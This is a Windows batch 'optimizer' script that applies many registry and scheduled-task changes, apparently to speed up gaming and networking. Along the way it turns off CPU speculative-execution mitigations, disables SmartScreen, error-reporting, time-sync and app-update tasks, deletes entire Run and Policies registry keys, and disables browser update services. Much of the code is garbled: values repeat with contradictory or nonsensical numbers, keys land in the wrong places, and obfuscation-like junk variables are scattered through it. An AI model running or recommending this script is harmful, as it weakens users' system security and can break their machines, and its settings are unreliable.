Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DeadGWDetectDefault" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DontAddDefaultGatewayDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableTCPA" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPMaxDataRetransmissions" /t REG_DWORD /d "7" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SynAttackProtect" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableDCA" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSize" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MTU" /t REG_DWORD /d "5220" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MSS" /t REG_DWORD /d "5156" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "CacheHashTableBucketSize" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "CacheHashTableSize" /t REG_DWORD /d "384" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxCacheEntryTtlLimit" /t REG_DWORD /d "64000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxSOACacheEntryTtlLimit" /t REG_DWORD /d "301" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeCacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NetFailureCacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeSOACacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "151807" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPDelAckTicks" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSize" /t REG_DWORD /d "372300" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "64" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_SZ /d "" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "32767" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpAckFrequency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "0" /f
reg export HKLM hklm.reg 
reg export HKCU hkcu.reg
reg export HKCR hkcr.reg 
reg export HKU  hku.reg 
reg export HKCC hkcc.reg
exit
cls
:BACKUP
title back up
goto LL


:fullclean
color a
cleanmgr
pause
color c
pause
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DistributeTimers" /t REG_DWORD /d "7" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "Network Throttling Index" /t REG_DWORD /d "FFFFFFFF" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{de4b4e40-a67b-4aec-8bce-95fb17f95863}" /v "TCPackFrequency" /t REG_DWORD /d "1" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{de4b4e40-a67b-4aec-8bce-95fb17f95863}" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSMQ" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSMQ\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverSearching" /v "SearchOrderConfig" /t REG_DWORD /d "0" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\ApplicationManagement\AllowGameDVR" /v "value" /t REG_SZ /d "00000000" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /v "HibernateEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKEY_CURRENT_USER\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKEY_CURRENT_USER\System\GameConfigStore" /v "GameDVR_FSEBehavior" /t REG_DWORD /d "0" /f
Reg.exe add "HKEY_CURRENT_USER\System\GameConfigStore" /v "GameDVR_FSEBehaviorMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "6" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_SZ /d "fffffff" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "00000000" /f
Reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "0" /f
Reg.exe add "HKEY_CURRENT_USER\Control Panel\Accessibility\MouseKeys" /v "Flags" /t REG_SZ /d "0" /f
Reg.exe add "HKEY_CURRENT_USER\Control Panel\Accessibility\StickyKeys" /v "Flags" /t REG_SZ /d "0" /f
Reg.exe add "HKEY_CURRENT_USER\Control Panel\Accessibility\Keyboard Response" /v "Flags" /t REG_SZ /d "0" /f
Reg.exe add "HKEY_CURRENT_USER\Control Panel\Accessibility\ToggleKeys" /v "Flags" /t REG_SZ /d "0" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" /v "MaintenanceDisabled" /t REG_DWORD /d "1" /f
taskkill /f /im explorer.exe
start explorer.exe
pause
:skip_local
title skip_local
@echo off
Set HEARTREALREALHEARTREAL=Vd2tApYH
Set HEARTHEARTHEARTREALHEART=ULRTc8KG
Set HEARTREALREALHEARTHEART=jW9buf1O
Set REALHEARTREALHEARTHEART=Sky0hFa6
Set HEARTHEARTREALHEARTREAL=DzmsgqEZ
Set HEARTHEARTHEARTREALHEARTREAL=NQevx3lJ
Set HEARTREALHEARTHEARTHEARTHEART=o45Xnr7
Set HEARTHEARTREALHEARTREALREAL=wPICBMi
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpAckFrequency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpDelAckTicks" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "MouseSpeed" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "MouseThreshold1" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "MouseThreshold2" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "AutoRepeatDelay" /t REG_SZ /d "200" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "AutoRepeatRate" /t REG_SZ /d "15" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "BounceTime" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "DelayBeforeAcceptance" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Flags" /t REG_SZ /d "59" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Last BounceKey Setting" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Last Valid Repeat" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Last Valid Wait" /t REG_DWORD /d "1000" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "19435519" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPDelAckTicks" /t REG_DWORD /d "19435519" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSize" /t REG_DWORD /d "372300" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "32767" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "372300" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpAckFrequency" /t REG_DWORD /d "1616" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "1616" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "117" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpAckFrequency" /t REG_DWORD /d "117" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "32767" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpAckFrequency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "IRPStackSize" /t REG_DWORD /d "50" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "SizReqBuf" /t REG_DWORD /d "95268" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "IRPStackSize" /t REG_DWORD /d "64" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Version" /t REG_SZ /d "1.7.10" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Path" /t REG_SZ /d "C:\USER\AppData\Roaming\.minecraft\versions\\" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "TcpAckFrequency" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MTU" /t REG_DWORD /d "5207" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MSS" /t REG_DWORD /d "1337" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "DefaultTTL" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSize" /t REG_DWORD /d "372300" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "32767" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_SZ /d "" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DefaultReceiveWindow" /t REG_DWORD /d "3539039" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DefaultSendWindow" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "3539039" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MTU" /t REG_DWORD /d "1500" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MSS" /t REG_DWORD /d "1460" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d "415028" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxHashTableSize" /t REG_DWORD /d "4096" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableWsd" /t REG_DWORD /d "0" /f
pause
:skip_current
title skip_current
@echo off
Set HEARTREALREALREALHEART=T5jPYLV0
Set HEARTHEARTHEARTHEARTHEART=3hG761gn
Set REALHEARTHEARTHEARTREALREAL=upFilEat
Set HEARTREALREALHEARTHEARTREAL=QZMkC9Df
Set HEARTREALREALHEARTHEARTHEART=WcqzrKwN
Set HEARTHEARTREALREALHEARTREAL=XSxRByb4
Set REALHEARTREALREALHEARTREAL=2doAUH8
Set REALREALHEARTHEARTHEARTREAL=JmIevOs
cls
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "4294967295" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f
pause
:cleanfiles
title cleanfiles
@echo off
Set REALHEARTHEARTHEARTREAL=IU5AbHcj
Set REALREALHEARTHEARTHEART=LnDPQzXO
Set REALHEARTHEARTREALREAL=kx4RFeSl
Set HEARTHEARTREALHEARTHEART=MqpTVrZw
Set REALHEARTHEARTREALHEART=g78EdBth
Set REALHEARTHEARTHEARTHEART=62KNm9Ja
Set HEARTREALREALHEARTREAL=Go0iuCv
Set HEARTHEARTHEARTHEARTREAL=sf3YyW1
cls
@echo off
title PARK CONFIG
color 4
cls
echo Making System Restore point just incase you forgot
echo.
wmic /namespace:\\root\default path systemrestore call createrestorepoint "QuickBoost"  100  12 >nul 2>&1
@echo off
REM *** Disable Start-up Telemetry and Programs to Improve Startup and Memory Usage ***
schtasks /end /tn "\Microsoft\Windows\Customer Experience Improvement Program\Consolidator"
schtasks /change /tn "\Microsoft\Windows\Customer Experience Improvement Program\Consolidator" /disable
schtasks /end /tn "\Microsoft\Windows\Customer Experience Improvement Program\BthSQM"
schtasks /change /tn "\Microsoft\Windows\Customer Experience Improvement Program\BthSQM" /disable
schtasks /end /tn "\Microsoft\Windows\Customer Experience Improvement Program\KernelCeipTask"
schtasks /change /tn "\Microsoft\Windows\Customer Experience Improvement Program\KernelCeipTask" /disable
schtasks /end /tn "\Microsoft\Windows\Customer Experience Improvement Program\UsbCeip"
schtasks /change /tn "\Microsoft\Windows\Customer Experience Improvement Program\UsbCeip" /disable
schtasks /end /tn "\Microsoft\Windows\Customer Experience Improvement Program\Uploader"
schtasks /change /tn "\Microsoft\Windows\Customer Experience Improvement Program\Uploader" /disable
schtasks /end /tn "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser"
schtasks /change /tn "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser" /disable
schtasks /end /tn "\Microsoft\Windows\Application Experience\ProgramDataUpdater"
schtasks /change /tn "\Microsoft\Windows\Application Experience\ProgramDataUpdater" /disable
schtasks /end /tn "\Microsoft\Windows\Application Experience\StartupAppTask"
schtasks /change /tn "\Microsoft\Windows\Application Experience\StartupAppTask" /disable"
schtasks /end /tn "\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector"
schtasks /change /tn "\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector" /disable
schtasks /end /tn "\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticResolver"
schtasks /change /tn "\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticResolver" /disable
schtasks /end /tn "\Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem"
schtasks /change /tn "\Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem" /disable
schtasks /end /tn "\Microsoft\Windows\Shell\FamilySafetyMonitor"
schtasks /change /tn "\Microsoft\Windows\Shell\FamilySafetyMonitor" /disable
schtasks /end /tn "\Microsoft\Windows\Shell\FamilySafetyRefresh"
schtasks /change /tn "\Microsoft\Windows\Shell\FamilySafetyRefresh" /disable
schtasks /end /tn "\Microsoft\Windows\Shell\FamilySafetyUpload"
schtasks /change /tn "\Microsoft\Windows\Shell\FamilySafetyUpload" /disable
schtasks /end /tn "\Microsoft\Windows\Autochk\Proxy"
schtasks /change /tn "\Microsoft\Windows\Autochk\Proxy" /disable
schtasks /end /tn "\Microsoft\Windows\Maintenance\WinSAT"
schtasks /change /tn "\Microsoft\Windows\Maintenance\WinSAT" /disable
schtasks /end /tn "\Microsoft\Windows\Application Experience\AitAgent"
schtasks /change /tn "\Microsoft\Windows\Application Experience\AitAgent" /disable
schtasks /end /tn "\Microsoft\Windows\Windows Error Reporting\QueueReporting"
schtasks /change /tn "\Microsoft\Windows\Windows Error Reporting\QueueReporting" /disable
schtasks /end /tn "\Microsoft\Windows\CloudExperienceHost\CreateObjectTask"
schtasks /change /tn "\Microsoft\Windows\CloudExperienceHost\CreateObjectTask" /disable
schtasks /end /tn "\Microsoft\Windows\DiskFootprint\Diagnostics"
schtasks /change /tn "\Microsoft\Windows\DiskFootprint\Diagnostics" /disable
schtasks /end /tn "\Microsoft\Windows\FileHistory\File History (maintenance mode)"
schtasks /change /tn "\Microsoft\Windows\FileHistory\File History (maintenance mode)" /disable
schtasks /end /tn "\Microsoft\Windows\PI\Sqm-Tasks"
schtasks /change /tn "\Microsoft\Windows\PI\Sqm-Tasks" /disable
schtasks /end /tn "\Microsoft\Windows\NetTrace\GatherNetworkInfo"
schtasks /change /tn "\Microsoft\Windows\NetTrace\GatherNetworkInfo" /disable
schtasks /end /tn "\Microsoft\Windows\AppID\SmartScreenSpecific"
schtasks /change /tn "\Microsoft\Windows\AppID\SmartScreenSpecific" /disable
schtasks /end /tn "\Microsoft\Office\OfficeTelemetryAgentFallBack2016"
schtasks /change /tn "\Microsoft\Office\OfficeTelemetryAgentFallBack2016" /disable
schtasks /end /tn "\Microsoft\Office\OfficeTelemetryAgentLogOn2016"
schtasks /change /tn "\Microsoft\Office\OfficeTelemetryAgentLogOn2016" /disable
schtasks /Change /TN "Microsoft\Windows\AppID\SmartScreenSpecific" /Disable
schtasks /Change /TN "Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser" /Disable
schtasks /Change /TN "Microsoft\Windows\Application Experience\ProgramDataUpdater" /Disable
schtasks /Change /TN "Microsoft\Windows\Application Experience\StartupAppTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement Program\Consolidator" /Disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement Program\KernelCeipTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement Program\UsbCeip" /Disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement Program\Uploader" /Disable
schtasks /Change /TN "Microsoft\Windows\Shell\FamilySafetyUpload" /Disable
schtasks /Change /TN "Microsoft\Office\OfficeTelemetryAgentLogOn" /Disable
schtasks /Change /TN "Microsoft\Office\OfficeTelemetryAgentFallBack" /Disable
schtasks /Change /TN "Microsoft\Office\Office 15 Subscription Heartbeat" /Disable
schtasks /Change /TN "Microsoft\Windows\Autochk\Proxy" /Disable
schtasks /Change /TN "Microsoft\Windows\CloudExperienceHost\CreateObjectTask" /Disable
schtasks /Change /TN "Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector" /Disable
schtasks /Change /TN "Microsoft\Windows\DiskFootprint\Diagnostics" /Disable
schtasks /Change /TN "Microsoft\Windows\FileHistory\File History (maintenance mode)" /Disable
schtasks /Change /TN "Microsoft\Windows\Maintenance\WinSAT" /Disable
schtasks /Change /TN "Microsoft\Windows\NetTrace\GatherNetworkInfo" /Disable
schtasks /Change /TN "Microsoft\Windows\PI\Sqm-Tasks" /Disable
schtasks /Change /TN "Microsoft\Windows\Time Synchronization\ForceSynchronizeTime" /Disable
schtasks /Change /TN "Microsoft\Windows\Time Synchronization\SynchronizeTime" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Error Reporting\QueueReporting" /Disable
schtasks /Change /TN "Microsoft\Windows\WindowsUpdate\Automatic App Update" /Disable
REG DELETE HKSU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /f
REG DELETE HKSU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /f
REG DELETE HKSU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies /f
REG DELETE HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce /f
REG DELETE HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run /f
REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce /f
REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices /f
REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx /f
REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /f
Reg add "HKLM\SYSTEM\CurrentControlSet\Services\EpicOnlineServices" /v "Start" /t REG_DWORD /d "4" /f
Reg add "HKLM\SYSTEM\CurrentControlSet\Services\GoogleChromeElevationService" /v "Start" /t REG_DWORD /d "4" /f
Reg add "HKLM\SYSTEM\CurrentControlSet\Services\gupdate" /v "Start" /t REG_DWORD /d "4" /f
